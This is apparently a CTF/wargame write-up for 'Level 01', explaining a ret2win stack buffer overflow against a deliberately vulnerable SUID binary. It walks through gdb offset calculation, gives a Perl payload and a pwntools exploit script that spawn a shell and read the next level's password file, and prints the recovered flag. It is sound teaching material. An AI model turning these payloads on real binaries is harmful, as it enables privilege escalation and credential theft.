# Level 01

## Exploit explanation : ret2win

This level exploit is **ret2win**. It comes from the same basis as *ret2shellcode*, but somewhat easier.

### How it works

Same as before, we need to modify the `saved rip` to make so that the `ret` instruction goes to the address that we want thanks to a buffer overflow. For a `ret2shellcode`, we want it to go to an injected shellcode. For `ret2win`, we want it to go to a `gadget` or a `function` that contains a way to get the flag.

An example would be :
`A x <padding / offset> | <address to win>`

### How to find one

Most of the time, we can find a `ret2win` thanks to a buffer overflow (like `ret2shellcode`) and useful functions or methods in the source code. They can include a `read`, `execve`, or anything really that can help us get close to the flag. For this exercise, we can see in the given source code a buffer overflow :

```c
#define OPERATOR_LEN 64

// ...

static void run_diagnostic(void)
{
    char op_id[OPERATOR_LEN];

    print_header();
    read(STDIN_FILENO, op_id, 256);
    // ...
}
```

(The buffer is of size *64*, but we read *256*. This may be big enough for a shellcode, but another exploit can be used here)

and an unused function :

```c
static void __attribute__((noinline)) maintenance_exec(long code)
{
    if (code == 0xdeadbeefL) {
        setreuid(geteuid(), geteuid());
        execl("/bin/sh", "sh", NULL);
    }
}
```

This function keeps the SUID and executes a subshell. If we can get inside, we can easily `cat` the flag file.


## Exploit application

### Computing the offset

First thing we need is simply to compute the number of `A`s to put in the buffer. As before, we can use the `1-offset-brute-force.sh` script to find it :
```bash
$ ./1-offset-brute-force.sh
./1-offset-brute-force.sh: line 13:  2725 Done                    printf 'a%.0s' $(seq 1 $count)
      2726 Segmentation fault      (core dumped) | ./ono > /dev/null
Crashed !
Crashed with count = 73
```

This means that it starts overwriting the `saved rip` at 73, so the offset is 72. We can again do it the smart way too with `gdb` for fun :
```gdb
(gdb) disas run_diagnostic
Dump of assembler code for function run_diagnostic:
    # ...
    # read(STDIN_FILENO, op_id, 256);
   0x00000000004013ab <+21>:	mov    $0x100,%edx  # 256
   0x00000000004013b0 <+26>:	mov    %rax,%rsi    # the buffer, op_id
   0x00000000004013b3 <+29>:	mov    $0x0,%edi    # STDIN_FILENO
   0x00000000004013b8 <+34>:	call   0x401140 <read@plt>
    # ...
   0x0000000000401449 <+179>:	nop
   0x000000000040144a <+180>:	leave
   0x000000000040144b <+181>:	ret
End of assembler dump.
(gdb) b *0x00000000004013b8 // on read
Breakpoint 1 at 0x4013b8
(gdb) info registers
rax            0x7fffffffe210      140737488347664
# ...
(gdb) info frame
Stack level 0, frame at 0x7fffffffe260:
 rip = 0x4013b8 in run_diagnostic; saved rip = 0x40145e
 called by frame at 0x7fffffffe270
 Arglist at 0x7fffffffe250, args: 
 Locals at 0x7fffffffe250, Previous frame's sp is 0x7fffffffe260
 Saved registers:
  rbp at 0x7fffffffe250, rip at 0x7fffffffe258
```

We now have the buffer address in `rax` : `0x7fffffffe210`, and the `saved rip` address : `0x7fffffffe258`.
We can substract to find the offset : `saved rip - buffer start` = `0x7fffffffe258 - 0x7fffffffe210` = `0x48` = `72`.

### Finding the return address

As seen before, we now there is a `win` in the function `maintenance_exec`. We can't just jump to the function because there is a condition for entering the `win`. We just have to jump after the condition :

```c
static void __attribute__((noinline)) maintenance_exec(long code)
{
    if (code == 0xdeadbeefL) { // This condition will be hard to verify... we don't have access to the registers easily
        setreuid(geteuid(), geteuid()); // We will just jump here instead
        execl("/bin/sh", "sh", NULL);
    }
}
```

Let's find the address with `gdb` :

```gdb
(gdb) disas maintenance_exec
Dump of assembler code for function maintenance_exec:
   0x0000000000401276 <+0>:	endbr64
   0x000000000040127a <+4>:	push   %rbp
   0x000000000040127b <+5>:	mov    %rsp,%rbp
   0x000000000040127e <+8>:	push   %rbx
   0x000000000040127f <+9>:	sub    $0x18,%rsp
   0x0000000000401283 <+13>:	mov    %rdi,-0x18(%rbp)
   0x0000000000401287 <+17>:	mov    $0xdeadbeef,%eax
   0x000000000040128c <+22>:	cmp    %rax,-0x18(%rbp)                 # Condition here
   0x0000000000401290 <+26>:	jne    0x4012ca <maintenance_exec+84>   # Here is the jump
   0x0000000000401292 <+28>:	call   0x401130 <geteuid@plt>           # We will jump here
   0x0000000000401297 <+33>:	mov    %eax,%ebx
   0x0000000000401299 <+35>:	call   0x401130 <geteuid@plt>
   0x000000000040129e <+40>:	mov    %ebx,%esi
   0x00000000004012a0 <+42>:	mov    %eax,%edi
   0x00000000004012a2 <+44>:	call   0x401160 <setreuid@plt>
   0x00000000004012a7 <+49>:	mov    $0x0,%edx
   0x00000000004012ac <+54>:	lea    0xd55(%rip),%rax        # 0x402008
   0x00000000004012b3 <+61>:	mov    %rax,%rsi
   0x00000000004012b6 <+64>:	lea    0xd4e(%rip),%rax        # 0x40200b
   0x00000000004012bd <+71>:	mov    %rax,%rdi
   0x00000000004012c0 <+74>:	mov    $0x0,%eax
   0x00000000004012c5 <+79>:	call   0x401180 <execl@plt>
   0x00000000004012ca <+84>:	nop
   0x00000000004012cb <+85>:	mov    -0x8(%rbp),%rbx
   0x00000000004012cf <+89>:	leave
   0x00000000004012d0 <+90>:	ret
End of assembler dump.
```

So the address we need to jump to is `0x0000000000401292`.

### Building the payload

We can build the payload easily with Perl, put it in a payload file, and pipe it :
```bash
$ perl -e 'print("A"x72 . "\x92\x12\x40")' >payload
$ cat payload - | ./ono
  [ONO-SENDAI VII] Cyberspace deck online.
  [ONO-SENDAI VII] Diagnostic subsystem v2.1.4
  [ONO-SENDAI VII] Waiting for operator ID: [ONO-SENDAI VII] Unknown operator. Logging attempt.

ls -la /home/flag01
total 28
drwx------  2 flag01 flag01 4096 Jun  9 23:13 .
drwxr-xr-x 37 root   root   4096 Jun  9 23:13 ..
-rw-r--r--  1 flag01 flag01  220 Mar 31  2024 .bash_logout
-rw-r--r--  1 flag01 flag01 3771 Mar 31  2024 .bashrc
-rw-r--r--  1 flag01 flag01   30 Jun  9 23:12 .gdbinit
-r--------  1 flag01 flag01   33 Jun  9 23:13 .pass
-rw-r--r--  1 flag01 flag01  807 Mar 31  2024 .profile
cat /home/flag01/.pass
3309s5bx9kagi0z0qt0erxvivievlh86
exit

```

Or we can automate it again with a Python script :

```python
#!/usr/bin/env python3
# 2-exploit.py

import os
import sys
import pwn

pwn.context.arch = 'amd64'
pwn.context.log_level = 'error'

OFFSET = 72
RET_ADDR = 0x0000000000401292

binary = "./ono"
if len(sys.argv) > 1:
    binary = sys.argv[1]

body = b'A' * OFFSET + pwn.p64(RET_ADDR)

with open("payload", "wb") as f:
    f.write(body)

p = pwn.process([binary])
p.sendline(body)
p.sendline(b'cat /home/flag01/.pass')
p.sendline(b'exit')
out = p.recvall(timeout=2)
p.close()

for raw in out.splitlines():
    s = raw.strip()
    if len(s) == 32 and s.isalnum():
        print(s.decode(errors='replace'))
```

And we launch it and find the flag :

```bash
$ python3 2-exploit.py
3309s5bx9kagi0z0qt0erxvivievlh86
```